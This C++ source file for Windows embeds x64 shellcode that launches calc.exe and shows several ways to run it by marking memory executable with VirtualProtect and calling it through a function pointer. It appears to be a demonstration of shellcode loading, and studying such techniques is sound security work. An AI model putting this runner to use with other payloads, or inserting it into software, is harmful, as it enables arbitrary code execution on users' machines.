#include <windows.h>

#include <array>
#include <cassert>
#include <cstddef>
#include <iostream>
#include <memory>
#include <functional>

namespace Utils {
  // clang-format off
  using std::to_array, std::array, std::byte;
  using std::wcout, std::endl, std::unique_ptr;

   static_assert(sizeof(byte) == 1, "Expecting 8 bits std::byte");

  // concat shellcode + suffix
  consteval auto CreateCode() {
    // To avoid exception after calc.exe execution
    // shellcode works without this
    constexpr auto suffix =
        to_array<byte>({byte{0x59}, byte{0x59}, byte{0x59}, byte{0x59},
                        byte{0x59}, byte{0x59}, byte{0x59}, byte{0xC3}});

    // https://github.com/boku7/x64win-DynamicNoNull-WinExec-PopCalc-Shellcode
    constexpr auto shellcode = to_array<byte>(
        {byte{0x48}, byte{0x31}, byte{0xFF}, byte{0x48}, byte{0xF7}, byte{0xE7},
         byte{0x65}, byte{0x48}, byte{0x8B}, byte{0x58}, byte{0x60}, byte{0x48},
         byte{0x8B}, byte{0x5B}, byte{0x18}, byte{0x48}, byte{0x8B}, byte{0x5B},
         byte{0x20}, byte{0x48}, byte{0x8B}, byte{0x1B}, byte{0x48}, byte{0x8B},
         byte{0x1B}, byte{0x48}, byte{0x8B}, byte{0x5B}, byte{0x20}, byte{0x49},
         byte{0x89}, byte{0xD8}, byte{0x8B}, byte{0x5B}, byte{0x3C}, byte{0x4C},
         byte{0x01}, byte{0xC3}, byte{0x48}, byte{0x31}, byte{0xC9}, byte{0x66},
         byte{0x81}, byte{0xC1}, byte{0xFF}, byte{0x88}, byte{0x48}, byte{0xC1},
         byte{0xE9}, byte{0x08}, byte{0x8B}, byte{0x14}, byte{0x0B}, byte{0x4C},
         byte{0x01}, byte{0xC2}, byte{0x4D}, byte{0x31}, byte{0xD2}, byte{0x44},
         byte{0x8B}, byte{0x52}, byte{0x1C}, byte{0x4D}, byte{0x01}, byte{0xC2},
         byte{0x4D}, byte{0x31}, byte{0xDB}, byte{0x44}, byte{0x8B}, byte{0x5A},
         byte{0x20}, byte{0x4D}, byte{0x01}, byte{0xC3}, byte{0x4D}, byte{0x31},
         byte{0xE4}, byte{0x44}, byte{0x8B}, byte{0x62}, byte{0x24}, byte{0x4D},
         byte{0x01}, byte{0xC4}, byte{0xEB}, byte{0x32}, byte{0x5B}, byte{0x59},
         byte{0x48}, byte{0x31}, byte{0xC0}, byte{0x48}, byte{0x89}, byte{0xE2},
         byte{0x51}, byte{0x48}, byte{0x8B}, byte{0x0C}, byte{0x24}, byte{0x48},
         byte{0x31}, byte{0xFF}, byte{0x41}, byte{0x8B}, byte{0x3C}, byte{0x83},
         byte{0x4C}, byte{0x01}, byte{0xC7}, byte{0x48}, byte{0x89}, byte{0xD6},
         byte{0xF3}, byte{0xA6}, byte{0x74}, byte{0x05}, byte{0x48}, byte{0xFF},
         byte{0xC0}, byte{0xEB}, byte{0xE6}, byte{0x59}, byte{0x66}, byte{0x41},
         byte{0x8B}, byte{0x04}, byte{0x44}, byte{0x41}, byte{0x8B}, byte{0x04},
         byte{0x82}, byte{0x4C}, byte{0x01}, byte{0xC0}, byte{0x53}, byte{0xC3},
         byte{0x48}, byte{0x31}, byte{0xC9}, byte{0x80}, byte{0xC1}, byte{0x07},
         byte{0x48}, byte{0xB8}, byte{0x0F}, byte{0xA8}, byte{0x96}, byte{0x91},
         byte{0xBA}, byte{0x87}, byte{0x9A}, byte{0x9C}, byte{0x48}, byte{0xF7},
         byte{0xD0}, byte{0x48}, byte{0xC1}, byte{0xE8}, byte{0x08}, byte{0x50},
         byte{0x51}, byte{0xE8}, byte{0xB0}, byte{0xFF}, byte{0xFF}, byte{0xFF},
         byte{0x49}, byte{0x89}, byte{0xC6}, byte{0x48}, byte{0x31}, byte{0xC9},
         byte{0x48}, byte{0xF7}, byte{0xE1}, byte{0x50}, byte{0x48}, byte{0xB8},
         byte{0x9C}, byte{0x9E}, byte{0x93}, byte{0x9C}, byte{0xD1}, byte{0x9A},
         byte{0x87}, byte{0x9A}, byte{0x48}, byte{0xF7}, byte{0xD0}, byte{0x50},
         byte{0x48}, byte{0x89}, byte{0xE1}, byte{0x48}, byte{0xFF}, byte{0xC2},
         byte{0x48}, byte{0x83}, byte{0xEC}, byte{0x20}, byte{0x41}, byte{0xFF},
         byte{0xD6}});

    array<byte, shellcode.size() + suffix.size()> code{};
    auto iterator = copy(shellcode.begin(), shellcode.end(), code.begin());
    copy(suffix.begin(), suffix.end(), iterator);

    return code;
  }

  void debugInfo() {
    constexpr LPCVOID noSource = nullptr;

    const DWORD errorCode = GetLastError();

    constexpr DWORD defaultLanguage = 0;

    const unique_ptr<LPTSTR, decltype(&LocalFree)> errorMsgBuffer{
        static_cast<LPTSTR *>(LocalAlloc(LPTR, sizeof(TCHAR))), &LocalFree};

    constexpr DWORD minErrorMsgBufferSize = 0;

    constexpr va_list *noArguments = nullptr;

    FormatMessage(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM |
            FORMAT_MESSAGE_IGNORE_INSERTS,
        noSource, errorCode, defaultLanguage,
        static_cast<LPWSTR>(static_cast<void *>(
            errorMsgBuffer.get())),  //  it expect LPTSTR* casted to LPTSTR
        minErrorMsgBufferSize, noArguments);

    if (!errorMsgBuffer) {
      wcout << "Format message failed error code: " + errorCode << endl;
      exit(EXIT_FAILURE);
    }

    wcout << "Error code " << errorCode;
    wcout << " and error message: " << *errorMsgBuffer << endl;
  }

  // clang-format on
}  //  namespace Utils

void classic_execution();
constexpr BOOL fail = 0;
extern "C" void ExecuteShellcode();

int main() {
  ExecuteShellcode();
  //  classic_execution();

  return EXIT_SUCCESS;
}

void classic_execution() {
  using std::function;
  using std::make_unique;

  auto code = Utils::CreateCode();
  //  As far as I know in older windows version like win7 you can
  //  execute directly the shellcode without the needs of change memory
  //  permissions.
  //  VirtualProtect requires that oldProtect points to valid memory so nullptr
  //  or 0 doesn't work. new DWORD can do the trick too but this last one
  //  requires to free the memory or it leaks.
  //  const unique_ptr<DWORD> oldProtect{};
  if (VirtualProtect(
          code.data(), code.size(), PAGE_EXECUTE_READWRITE, make_unique<DWORD>().get()) == fail) {
    Utils::debugInfo();
    return exit(EXIT_FAILURE);
  }

  using exePtrType = void (*)();

  //  three options
  //  1
  function<void()> executionFunc = reinterpret_cast<exePtrType>(code.data());
  executionFunc();

  //  2
  //  (reinterpret_cast<exePtrType>(code.data()))();

  //  3
  //  exePtrType shellcodeFunction = reinterpret_cast<exePtrType>(code.data());
  //  shellcodeFunction();
}
